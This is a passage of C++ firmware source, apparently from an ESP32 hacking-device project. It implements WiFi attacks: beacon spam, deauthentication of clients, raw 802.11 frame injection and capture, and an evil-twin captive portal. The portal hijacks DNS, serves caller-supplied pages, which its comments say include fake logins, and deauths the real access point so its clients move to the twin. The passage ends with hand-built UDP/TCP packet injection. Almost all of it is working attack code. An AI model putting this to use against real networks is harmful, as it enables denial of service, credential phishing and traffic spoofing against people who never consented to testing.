                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
#endif
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
    wifi_atk_unsetWifi();
}

void enhancedDeauthMenu() {
    resetGlobalState();

    options = {
        {"Station Deauth (Single)", [=]() { showTargetSelection(); } },
        {"Deauth All Clients",      [=]() { deauthAllMenu(); }       },
        {"Deauth Target List",      [=]() { deauthTargetListMenu(); }},
        {"Back",                    [=]() { returnToMenu = true; }   },
    };
    addOptionToMainMenu();
    loopOptions(options);
}

// ============================================================================
// Headless (UI-free) helpers used by the bjs interpreter bindings.
// They reuse the menu attack primitives but stop on a deadline instead of
// waiting for a button press, so a BruceScript can drive them.
// ============================================================================

static void headlessBeaconSpamList(const char list[], uint32_t deadline, uint32_t *frames) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    nextChannel();

    while (i < ssidsLen) {
        if ((int32_t)(deadline - millis()) <= 0) break;

        char ssidBuf[32];
        int j = 0;
        char tmp;
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        generateRandomWiFiMac(macAddr);
        size_t pktLen = prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);
        for (int k = 0; k < 2; k++) {
            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
            vTaskDelay(1 / portTICK_PERIOD_MS);
            (*frames)++;
        }

        i += j;
    }
}

int headlessBeaconSpam(uint8_t mode, const String &baseSSID, uint32_t durationMs) {
    if (durationMs == 0) durationMs = 1000;
    if (durationMs > 300000) durationMs = 300000; // 5 minute safety cap

    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    srand(millis());

    if (!wifi_atk_setWifi()) { return 0; }
    wifiConnected = true;

    uint32_t frames = 0;
    uint32_t deadline = millis() + durationMs;
    int counter = 1;

    while ((int32_t)(deadline - millis()) > 0) {
        switch (mode) {
            case 1: headlessBeaconSpamList(rickrollssids, deadline, &frames); break;
            case 2: headlessBeaconSpamList(randomSSID(), deadline, &frames); break;
            case 4: {
                String currentSSID = baseSSID + String(counter);
                if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
                uint8_t ssidLen = currentSSID.length();

                uint8_t beaconPacket[BEACON_PKT_LEN];
                uint8_t macAddr[6];
                generateRandomWiFiMac(macAddr);
                size_t pktLen =
                    prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);
                for (int k = 0; k < 2; k++) {
                    wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
                    vTaskDelay(1 / portTICK_PERIOD_MS);
                    frames++;
                }

                counter++;
                if (counter > 9999) {
                    counter = 1;
                    nextChannel();
                }
                break;
            }
            case 0:
            default: headlessBeaconSpamList(Beacons, deadline, &frames); break;
        }
        if (EscPress) break;
    }

    wifi_atk_unsetWifi();
    return (int)frames;
}

// ============================================================================
// Raw 802.11 injection / capture engine.
//
// Injection goes through wifiRawTx() (a thin retrying wrapper over
// esp_wifi_80211_tx) and capture goes through the promiscuous RX callback. Only
// one capture can run at a time: the ESP32 has a single radio, so a second
// capture would fight the first one for the channel. Captured bytes are parked
// in a PSRAM pool so a long capture cannot fragment the internal heap.
// ============================================================================

struct RawCaptureEntry {
    uint32_t timestamp; // millis() when the frame arrived
    uint8_t channel;    // channel reported by the radio's RX control block
    int8_t rssi;
    uint16_t len;
    uint16_t offset; // into the session pool
};

struct RawCaptureSession {
    bool used;
    bool running;
    uint8_t channel;
    uint32_t startMs;
    uint32_t deadlineMs; // 0 = no deadline
    uint32_t packetCount;
    uint32_t dropped;
    uint16_t poolUsed;
    uint8_t *pool; // WIFI_CAP_MAX_BYTES, PSRAM when available
    RawCaptureEntry entries[WIFI_CAP_MAX_PACKETS];
};

static RawCaptureSession rawCaptureSessions[WIFI_CAP_MAX_SESSIONS];
static volatile int rawActiveSession = -1;
static portMUX_TYPE rawCaptureMux = portMUX_INITIALIZER_UNLOCKED;
static volatile uint32_t rawPromiscPackets = 0;
static bool rawPromiscOn = false;
static bool rawStandalonePromisc = false;
static bool rawCapturePromisc = false; // promiscuous mode is held by a capture session
static bool rawWifiStartedByUs = false;

static void raw_capture_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);
static void raw_promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type);

static void raw_promisc_apply(bool enable) {
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;

    if (enable) {
        esp_wifi_set_promiscuous_filter(&filt);
        if (rawActiveSession >= 0) {
            esp_wifi_set_promiscuous_rx_cb(raw_capture_rx_cb);
        } else {
            esp_wifi_set_promiscuous_rx_cb(raw_promisc_rx_cb);
        }
        esp_wifi_set_promiscuous(true);
        rawPromiscOn = true;
    } else {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        rawPromiscOn = false;
    }
}

// Counts frames while promiscuous mode is on without an active capture session.
static void raw_promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)type;
    if (buf == NULL) return;
    rawPromiscPackets = rawPromiscPackets + 1;
}

// Promiscuous RX callback: copies the frame into the active session's PSRAM pool.
// Runs in the WiFi task, so keep the critical section tiny and allocation-free.
static void raw_capture_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    (void)type;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt == NULL) return;

    uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;
    if (len == 0) return;
    if (len > WIFI_RAW_MAX_FRAME) len = WIFI_RAW_MAX_FRAME;

    rawPromiscPackets = rawPromiscPackets + 1;

    int sid = rawActiveSession;
    if (sid < 0) return;

    RawCaptureSession &s = rawCaptureSessions[sid];
    uint32_t now = millis();

    portENTER_CRITICAL(&rawCaptureMux);
    if (!s.running || s.pool == NULL) {
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }
    if (s.deadlineMs != 0 && (int32_t)(now - s.deadlineMs) >= 0) {
        // Deadline reached: stop collecting. The JS side reaps the session, which
        // is where promiscuous mode gets switched off (not safe from this task).
        s.running = false;
        rawActiveSession = -1;
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }
    if (s.packetCount >= WIFI_CAP_MAX_PACKETS || (uint32_t)s.poolUsed + len > WIFI_CAP_MAX_BYTES) {
        s.dropped++;
        portEXIT_CRITICAL(&rawCaptureMux);
        return;
    }

    RawCaptureEntry &e = s.entries[s.packetCount];
    e.timestamp = now;
    e.channel = (uint8_t)pkt->rx_ctrl.channel;
    e.rssi = (int8_t)pkt->rx_ctrl.rssi;
    e.len = len;
    e.offset = s.poolUsed;
    memcpy(s.pool + s.poolUsed, pkt->payload, len);
    s.poolUsed += len;
    s.packetCount++;
    portEXIT_CRITICAL(&rawCaptureMux);
}

static uint32_t raw_crc32(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int b = 0; b < 8; b++) {
            crc = (crc >> 1) ^ (0xEDB88320u & (uint32_t)(-(int32_t)(crc & 1u)));
        }
    }
    return ~crc;
}

bool wifi_raw_prepare(int channel) {
    // WiFi already up: skip wifi_atk_setWifi() so injection loops do not re-print
    // its heap log on every frame. Non-NULL mode means "initialised" here, which
    // is the same assumption the on-screen attacks make.
    if (WiFi.getMode() == WIFI_MODE_NULL) {
        if (!wifi_atk_setWifi()) { return false; }
        rawWifiStartedByUs = true;
    }

    if (channel >= 1 && channel <= 14) {
        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
        wifi_channel = (uint8_t)channel;
    }
    return true;
}

WifiRawTxResult wifi_raw_inject(
    const uint8_t *frame, size_t rawLen, uint8_t channel, uint8_t repeat, int iface, bool appendFcs,
    uint32_t gapMs
) {
    WifiRawTxResult res = {};
    res.channel = channel;
    res.ok = false;

    if (frame == NULL || rawLen < 10) {
        res.error = "frame too short (min 10 bytes)";
        return res;
    }
    if (rawLen > WIFI_RAW_MAX_FRAME) {
        res.error = "frame too long (max 1500 bytes)";
        return res;
    }
    if (channel < 1 || channel > 14) {
        res.error = "channel must be 1-14";
        return res;
    }
    if (repeat < 1) repeat = 1;
    if (repeat > 64) repeat = 64;
    if (gapMs > 100) gapMs = 100;

    uint8_t buf[WIFI_RAW_MAX_FRAME + 4];
    size_t len = rawLen;
    memcpy(buf, frame, rawLen);
    if (appendFcs) {
        uint32_t fcs = raw_crc32(buf, rawLen);
        buf[len++] = (uint8_t)(fcs & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 8) & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 16) & 0xFF);
        buf[len++] = (uint8_t)((fcs >> 24) & 0xFF);
    }
    res.len = (int)len;

    if (!wifi_raw_prepare(channel)) {
        res.error = "failed to start WiFi";
        return res;
    }
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    wifi_channel = channel;

    // Auto: try station first (the only supported interface on C-series parts),
    // then AP. Forced iface skips the fallback so failures stay visible.
    wifi_interface_t candidates[2];
    int candidateCount = 0;
    if (iface == 1) {
        candidates[candidateCount++] = WIFI_IF_AP;
    } else if (iface == 0) {
        candidates[candidateCount++] = WIFI_IF_STA;
    } else {
        candidates[candidateCount++] = WIFI_IF_STA;
        candidates[candidateCount++] = WIFI_IF_AP;
    }

    wifi_interface_t chosen = candidates[0];
    esp_err_t err = ESP_FAIL;
    bool haveIface = false;
    for (int i = 0; i < candidateCount; i++) {
        err = wifiRawTx(candidates[i], buf, len);
        if (err == ESP_OK || err == ESP_ERR_NO_MEM) {
            chosen = candidates[i];
            haveIface = true;
            break;
        }
        res.error = esp_err_to_name(err);
    }
    if (!haveIface) {
        res.failed = repeat;
        if (res.error == NULL) res.error = "esp_wifi_80211_tx rejected the frame";
        return res;
    }

    res.iface = (chosen == WIFI_IF_AP) ? "ap" : "sta";
    res.sent = 1; // the probe transmission above already went out
    for (uint8_t i = 1; i < repeat; i++) {
        esp_err_t e = wifiRawTx(chosen, buf, len);
        if (e == ESP_OK) {
            res.sent++;
        } else {
            res.failed++;
        }
        if (gapMs > 0) vTaskDelay(pdMS_TO_TICKS(gapMs));
    }

    res.ok = true;
    return res;
}

bool wifi_raw_capture_poll() {
    bool reaped = false;

    int sid = rawActiveSession;
    if (sid >= 0) {
        RawCaptureSession &s = rawCaptureSessions[sid];
        if (s.deadlineMs != 0 && (int32_t)(millis() - s.deadlineMs) >= 0) {
            s.running = false;
            rawActiveSession = -1;
            reaped = true;
        }
    }

    // A capture that ended on its own deadline (or from the RX callback) still
    // holds promiscuous mode until it is reaped here, which is where it is safe
    // to touch the WiFi driver again.
    if (rawActiveSession < 0 && rawCapturePromisc) {
        rawCapturePromisc = false;
        raw_promisc_apply(rawStandalonePromisc);
        reaped = true;
    }
    return reaped;
}

int wifi_raw_capture_start(uint8_t channel, uint32_t timeoutMs) {
    if (channel < 1 || channel > 14) return -1;

    wifi_raw_capture_poll();
    if (rawActiveSession >= 0) return -1; // one capture at a time (single radio)

    if (timeoutMs == 0) timeoutMs = 60000;
    if (timeoutMs < 200) timeoutMs = 200;
    if (timeoutMs > 60000) timeoutMs = 60000;

    int slot = -1;
    for (int i = 0; i < WIFI_CAP_MAX_SESSIONS; i++) {
        if (!rawCaptureSessions[i].used) {
            slot = i;
            break;
        }
    }
    if (slot < 0) { // reuse the oldest stopped session
        uint32_t oldest = 0xFFFFFFFF;
        for (int i = 0; i < WIFI_CAP_MAX_SESSIONS; i++) {
            if (!rawCaptureSessions[i].running && rawCaptureSessions[i].startMs <= oldest) {
                oldest = rawCaptureSessions[i].startMs;
                slot = i;
            }
        }
    }
    if (slot < 0) return -1;

    RawCaptureSession &s = rawCaptureSessions[slot];
    if (s.pool == NULL) {
        s.pool = (uint8_t *)(psramFound() ? ps_malloc(WIFI_CAP_MAX_BYTES) : malloc(WIFI_CAP_MAX_BYTES));
        if (s.pool == NULL) {
            Serial.println("[WIFI_RAW] capture pool allocation failed");
            return -1;
        }
    }

    s.used = true;
    s.running = false;
    s.channel = channel;
    s.startMs = millis();
    s.deadlineMs = s.startMs + timeoutMs;
    s.packetCount = 0;
    s.dropped = 0;
    s.poolUsed = 0;

    if (!wifi_raw_prepare(channel)) {
        Serial.println("[WIFI_RAW] failed to start WiFi for capture");
        return -1;
    }

    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(raw_capture_rx_cb);
    esp_err_t e = esp_wifi_set_promiscuous(true);
    if (e != ESP_OK) {
        Serial.printf("[WIFI_RAW] esp_wifi_set_promiscuous: %s\n", esp_err_to_name(e));
        return -1;
    }

    rawPromiscOn = true;
    rawCapturePromisc = true;
    s.running = true;
    rawActiveSession = slot;
    return slot + 1;
}

bool wifi_raw_capture_stop(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return false;
    if (!rawCaptureSessions[slot].used) return false;

    wifi_raw_capture_poll(); // reap it first if its deadline already passed
    bool ownsRadio = (rawActiveSession == slot) || (rawActiveSession < 0 && rawCapturePromisc);
    rawCaptureSessions[slot].running = false;

    if (ownsRadio) {
        rawActiveSession = -1;
        rawCapturePromisc = false;
        // Captured data stays in the pool for wifi_raw_capture_packet().
        raw_promisc_apply(rawStandalonePromisc);
    }
    return true;
}

bool wifi_raw_capture_running(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return false;
    return rawCaptureSessions[slot].used && rawCaptureSessions[slot].running;
}

int wifi_raw_capture_packet_count(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return -1;
    if (!rawCaptureSessions[slot].used) return -1;
    return (int)rawCaptureSessions[slot].packetCount;
}

int wifi_raw_capture_dropped(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return -1;
    if (!rawCaptureSessions[slot].used) return -1;
    return (int)rawCaptureSessions[slot].dropped;
}

int wifi_raw_capture_channel(int sessionId) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return 0;
    if (!rawCaptureSessions[slot].used) return 0;
    return rawCaptureSessions[slot].channel;
}

bool wifi_raw_capture_packet(
    int sessionId, int index, uint32_t *timestamp, uint8_t *channel, int8_t *rssi, const uint8_t **data,
    uint16_t *len
) {
    int slot = sessionId - 1;
    if (slot < 0 || slot >= WIFI_CAP_MAX_SESSIONS) return false;

    RawCaptureSession &s = rawCaptureSessions[slot];
    portENTER_CRITICAL(&rawCaptureMux);
    if (!s.used || index < 0 || (uint32_t)index >= s.packetCount || s.pool == NULL) {
        portEXIT_CRITICAL(&rawCaptureMux);
        return false;
    }
    const RawCaptureEntry &e = s.entries[index];
    if (timestamp != NULL) *timestamp = e.timestamp;
    if (channel != NULL) *channel = e.channel;
    if (rssi != NULL) *rssi = e.rssi;
    if (data != NULL) *data = s.pool + e.offset;
    if (len != NULL) *len = e.len;
    portEXIT_CRITICAL(&rawCaptureMux);
    return true;
}

bool wifi_raw_set_promiscuous(bool enable, uint8_t channel) {
    if (enable) {
        if (channel >= 1 && channel <= 14) {
            if (!wifi_raw_prepare(channel)) return false;
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            wifi_channel = channel;
        } else if (WiFi.getMode() == WIFI_MODE_NULL) {
            if (!wifi_raw_prepare(-1)) return false;
        }
        rawStandalonePromisc = true;
        raw_promisc_apply(true);
        return true;
    }

    rawStandalonePromisc = false;
    int sid = rawActiveSession;
    if (sid >= 0) { rawCaptureSessions[sid].running = false; }
    rawActiveSession = -1;
    rawCapturePromisc = false;
    raw_promisc_apply(false);
    return true;
}

void wifi_raw_cleanup() {
    rawActiveSession = -1;
    for (int i = 0; i < WIFI_CAP_MAX_SESSIONS; i++) {
        rawCaptureSessions[i].running = false;
        if (rawCaptureSessions[i].pool != NULL) {
            free(rawCaptureSessions[i].pool);
            rawCaptureSessions[i].pool = NULL;
        }
        rawCaptureSessions[i].used = false;
        rawCaptureSessions[i].packetCount = 0;
        rawCaptureSessions[i].poolUsed = 0;
    }

    if (rawPromiscOn) { raw_promisc_apply(false); }
    rawStandalonePromisc = false;
    rawCapturePromisc = false;

    if (rawWifiStartedByUs) {
        rawWifiStartedByUs = false;
        wifi_atk_unsetWifi();
    }
}

// ============================================================================
// Evil-twin captive portal engine (backs wifi.portal()).
//
// Same shape as EvilPortal: an open twin AP on the target channel, a wildcard
// DNS server so every name resolves to us, and an AsyncWebServer that answers
// the OS captive-portal probes with a redirect and everything else with the
// caller's page. The page (or redirect target) comes from the script, so one
// engine covers rickrolls, fake logins and splash pages alike.
// ============================================================================

static AsyncWebServer *portalServer = nullptr;
static DNSServer *portalDns = nullptr;
static volatile uint32_t portalRequests = 0;
static portMUX_TYPE portalMux = portMUX_INITIALIZER_UNLOCKED;
static String portalPage;     // served for every non-probe request
static String portalRedirect; // when set, every request goes here instead

static void portal_count_request() {
    // Plain assignment (not ++) so the volatile flag does not trip -Wvolatile.
    portENTER_CRITICAL(&portalMux);
    uint32_t next = portalRequests + 1;
    portalRequests = next;
    portEXIT_CRITICAL(&portalMux);
}

// The caller's page, or a 302 to the caller's URL when one was given.
static void portal_send_page(AsyncWebServerRequest *request) {
    portal_count_request();
    if (portalRedirect.length() > 0) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", portalRedirect);
        response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate");
        request->send(response);
        return;
    }
    request->send(200, "text/html", portalPage);
}

// The paths the OSes probe to decide "is this network captive?". Answering them
// with a redirect is what makes Windows/macOS/Android/Linux open their
// "sign in to network" browser, which is where the payload page lands.
static const char *portalProbePaths[] = {
    "/generate_204",
    "/gen_204",
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect",
    "/success.txt",
    "/canonical.html",
    "/fwlink",
    "/wpad.dat",
    "/mobile/status.php",
};

static void portal_send_probe(AsyncWebServerRequest *request) {
    portal_count_request();
    AsyncWebServerResponse *response = request->beginResponse(302);
    response->addHeader(
        "Location", portalRedirect.length() > 0 ? portalRedirect : "http://" + WiFi.softAPIP().toString() + "/"
    );
    response->addHeader("Cache-Control", "no-store, no-cache, must-revalidate");
    request->send(response);
}

// Unknown paths: clients request their probe with the vendor host in the path
// (/nmcheck.gnome.org, /clients3.google.com/generate_204, ...), so match on
// substrings rather than exact paths.
static void portal_send_catchall(AsyncWebServerRequest *request) {
    String url = request->url();
    static const char *probeHints[] = {
        "detectportal", "connecttest", "msftconnecttest", "clients3.google.com", "generate_204", "gen_204",
        "ncsi",         "nmcheck",     "gnome",           "ubuntu",               "canonical",    "networkcheck",
        "hotspot",      "success.txt", "captive",         "apple.com",
    };
    for (size_t i = 0; i < sizeof(probeHints) / sizeof(probeHints[0]); i++) {
        if (url.indexOf(probeHints[i]) != -1) {
            portal_send_probe(request);
            return;
        }
    }
    portal_send_page(request);
}

// One tick of deauth at the real AP, so its clients (re)associate with the twin.
static uint32_t portal_deauth_burst(const uint8_t bssid[6], uint8_t channel) {
    uint32_t sent = 0;
    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = channel;
    wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
    sent++;
    for (int i = 0; i < 3; i++) {
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        sent += 3; // send_raw_frame() transmits each frame three times
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    return sent;
}

WifiPortalStats wifi_portal_run(const WifiPortalConfig &cfg) {
    WifiPortalStats stats;

    String ssid = cfg.ssid;
    ssid.trim();
    if (ssid.length() == 0 || ssid.length() > 32) {
        stats.error = "ssid must be 1-32 characters";
        return stats;
    }
    if (cfg.channel < 1 || cfg.channel > 14) {
        stats.error = "channel must be 1-14";
        return stats;
    }

    uint32_t duration = cfg.durationMs;
    if (duration < WIFI_PORTAL_MIN_MS) duration = WIFI_PORTAL_MIN_MS;
    if (duration > WIFI_PORTAL_MAX_MS) duration = WIFI_PORTAL_MAX_MS;

    String page = cfg.html;
    if (page.length() == 0 && cfg.htmlFile.length() > 0) {
        bool sdDetected = setupSdCard();
        FS *fs = sdDetected ? (FS *)&SD : (FS *)&LittleFS;
        if (fs->exists(cfg.htmlFile)) {
            File f = fs->open(cfg.htmlFile, FILE_READ);
            if (f) {
                page = f.readString();
                f.close();
            }
        }
        if (page.length() == 0) {
            stats.error = "htmlFile could not be read";
            return stats;
        }
    }
    if (page.length() == 0 && cfg.redirect.length() == 0) {
        stats.error = "nothing to serve: pass html, htmlFile or redirect";
        return stats;
    }

    // Own the radio: stop the firmware web UI, any capture / promiscuous mode and
    // any AP left over from an earlier binding.
    cleanlyStopWebUiForWiFiFeature();
    wifi_raw_cleanup();
    wifi_complete_cleanup();

    IPAddress gateway;
    if (!gateway.fromString(cfg.gateway.length() > 0 ? cfg.gateway : bruceConfig.evilPortalGatewayIp)) {
        gateway = IPAddress(172, 0, 0, 1);
    }

    portalPage = page;
    portalRedirect = cfg.redirect;
    portalRequests = 0;

    if (!WiFi.mode(WIFI_MODE_AP)) {
        stats.error = "failed to start WiFi in AP mode";
        wifi_complete_cleanup(false);
        return stats;
    }
    WiFi.softAPConfig(gateway, gateway, IPAddress(255, 255, 255, 0));

    String pass = cfg.password.length() > 0 ? cfg.password : emptyString;
    if (!WiFi.softAP(ssid.c_str(), pass.c_str(), cfg.channel, 0, cfg.maxClients)) {
        stats.error = "softAP failed for this ssid/channel/password";
        WiFi.mode(WIFI_OFF);
        return stats;
    }
    wifiConnected = true;
    stats.ip = WiFi.softAPIP().toString();

    // Give the AP + its DHCP server a moment before clients can associate.
    uint32_t settle = millis();
    while (millis() - settle < 1200) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    portalServer = new (std::nothrow) AsyncWebServer(80);
    if (portalServer == nullptr) {
        stats.error = "out of memory for the captive portal server";
        WiFi.softAPdisconnect(true);
        wifi_complete_cleanup(false);
        return stats;
    }
    for (size_t i = 0; i < sizeof(portalProbePaths) / sizeof(portalProbePaths[0]); i++) {
        portalServer->on(portalProbePaths[i], HTTP_GET, portal_send_probe);
    }
    portalServer->on("/", HTTP_GET, portal_send_page);
    portalServer->onNotFound(portal_send_catchall);
    portalServer->begin();

    if (cfg.hijackDns) {
        portalDns = new (std::nothrow) DNSServer();
        if (portalDns != nullptr) portalDns->start(53, "*", WiFi.softAPIP());
    }

    bool deauthOn = cfg.deauth && cfg.hasTargetBssid;
    if (deauthOn) { memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); }

    Serial.printf(
        "[PORTAL] '%s' on ch%d at %s for %lums (redirect=%s dns=%d deauth=%d)\n",
        ssid.c_str(),
        cfg.channel,
        stats.ip.c_str(),
        (unsigned long)duration,
        cfg.redirect.length() > 0 ? cfg.redirect.c_str() : "none",
        portalDns != nullptr ? 1 : 0,
        deauthOn ? 1 : 0
    );

    uint32_t start = millis();
    uint32_t deadline = start + duration;
    uint32_t lastDeauth = millis();

    while ((int32_t)(deadline - millis()) > 0) {
        if (portalDns != nullptr) portalDns->processNextRequest();

        if (deauthOn && (millis() - lastDeauth) >= 250) {
            stats.deauthFrames += portal_deauth_burst(cfg.targetBssid, cfg.channel);
            lastDeauth = millis();
        }

        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    stats.clients = WiFi.softAPgetStationNum();
    stats.elapsedMs = millis() - start;

    // Always tear down, however the loop ended.
    if (portalDns != nullptr) {
        portalDns->stop();
        delete portalDns;
        portalDns = nullptr;
    }
    if (portalServer != nullptr) {
        portalServer->end();
        vTaskDelay(pdMS_TO_TICKS(50));
        delete portalServer;
        portalServer = nullptr;
    }
    WiFi.softAPdisconnect(true);
    wifi_complete_cleanup(false);
    portalPage = "";
    portalRedirect = "";

    stats.requests = portalRequests;
    stats.ok = true;
    Serial.printf(
        "[PORTAL] stopped after %lums: %lu requests, %d clients, %lu deauth frames\n",
        (unsigned long)stats.elapsedMs,
        (unsigned long)stats.requests,
        stats.clients,
        (unsigned long)stats.deauthFrames
    );
    return stats;
}

// ============================================================================
// Application layer injection: DNS replies and raw UDP / TCP payloads.
//
// Frames are built by hand (802.11 header -> LLC/SNAP -> IPv4 -> UDP/TCP ->
// payload) and transmitted with wifi_raw_inject(), so the whole stack is under
// script control. Checksums are computed for real: a receiver drops a TCP
// segment with a bad checksum even when everything else matches.
//
// The scratch buffers are static rather than on the stack because the JS task
// carries a 1500 byte frame of its own already.
// ============================================================================

#define WIFI_L4_HEADER_ROOM (24 + 8 + 20 + 20) // 802.11 + LLC/SNAP + IPv4 + TCP

static uint8_t l4Packet[WIFI_RAW_MAX_FRAME + 8];
static uint8_t l4Frame[WIFI_RAW_MAX_FRAME + 8];
static uint16_t l4IpId = 0;
static uint8_t l4SeqNum = 0;

static void l3_put_u16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFF);
}

static void l3_put_u32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

// Running 16-bit ones-complement sum, fed with network order data.
static uint32_t l4_partial_sum(const uint8_t *data, size_t len, uint32_t acc) {
    size_t i = 0;
    for (; i + 1 < len; i += 2) acc += ((uint16_t)data[i] << 8) | data[i + 1];
    if (i < len) acc += (uint16_t)data[i] << 8;
    return acc;
}

static uint16_t l4_finish(uint32_t acc) {
    while (acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
    return (uint16_t)(~acc);
}

static uint32_t l4_pseudo_sum(uint32_t srcIp, uint32_t dstIp, uint8_t proto, uint16_t l4Len) {
    uint32_t acc = l4_partial_sum((const uint8_t *)&srcIp, 4, 0);
    acc = l4_partial_sum((const uint8_t *)&dstIp, 4, acc);
    acc += proto;
    acc += l4Len;
    return acc;
}

// 802.11 data frame from the AP (FromDS=1): addr1 = station, addr2/3 = BSSID.
static size_t build_data_frame(
    uint8_t *out, size_t cap, const uint8_t dst[6], const uint8_t bssid[6], const uint8_t *payload, size_t len
) {
    if (cap < 32 + len) return 0;

    out[0] = 0x08; // frame control: data
    out[1] = 0x02; // flags: FromDS
    out[2] = 0x00; // duration
    out[3] = 0x00;
    memcpy(out + 4, dst, 6);   // addr1 receiver
    memcpy(out + 10, bssid, 6); // addr2 transmitter
    memcpy(out + 16, bssid, 6); // addr3 source
    out[22] = (uint8_t)(l4SeqNum << 4);
    out[23] = 0x00;

    static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00}; // RFC1042 / IPv4
    memcpy(out + 24, snap, 8);
    memcpy(out + 32, payload, len);
    return 32 + len;
}

static size_t build_ipv4_udp(
    uint8_t *out, size_t cap, uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 8 + payloadLen;
    size_t total = 20 + l4Len;
    if (cap < total) return 0;

    out[0] = 0x45;
    out[1] = 0x00;
    l3_put_u16(out + 2, (uint16_t)total);
    l3_put_u16(out + 4, ++l4IpId);
    l3_put_u16(out + 6, 0x0000);
    out[8] = 64;
    out[9] = 17; // UDP
    l3_put_u16(out + 10, 0);
    l3_put_u32(out + 12, srcIp);
    l3_put_u32(out + 16, dstIp);
    l3_put_u16(out + 10, l4_finish(l4_partial_sum(out, 20, 0)));

    uint8_t *udp = out + 20;
    l3_put_u16(udp, srcPort);
    l3_put_u16(udp + 2, dstPort);
    l3_put_u16(udp + 4, (uint16_t)l4Len);
    l3_put_u16(udp + 6, 0);
    memcpy(udp + 8, payload, payloadLen);

    uint32_t acc = l4_pseudo_sum(srcIp, dstIp, 17, (uint16_t)l4Len);
    acc = l4_partial_sum(udp, l4Len, acc);
    uint16_t sum = l4_finish(acc);
    l3_put_u16(udp + 6, sum == 0 ? 0xFFFF : sum);
    return total;
}

static size_t build_ipv4_tcp(
    uint8_t *out, size_t cap, uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort, uint32_t seq,
    uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 20 + payloadLen;
    size_t total = 20 + l4Len;
    if (cap < total) return 0;

    out[0] = 0x45;
    out[1] = 0x00;
    l3_put_u16(out + 2, (uint16_t)total);
    l3_put_u16(out + 4, ++l4IpId);
    l3_put_u16(out + 6, 0x4000); // don't fragment
    out[8] = 64;
    out[9] = 6; // TCP
    l3_put_u16(out + 10, 0);
    l3_put_u32(out + 12, srcIp);
    l3_put_u32(out + 16, dstIp);
    l3_put_u16(out + 10, l4_finish(l4_partial_sum(out, 20, 0)));

    uint8_t *tcp = out + 20;
    l3_put_u16(tcp, srcPort);
    l3_put_u16(tcp + 2, dstPort);
    l3_put_u32(tcp + 4, seq);
    l3_put_u32(tcp + 8, ack);
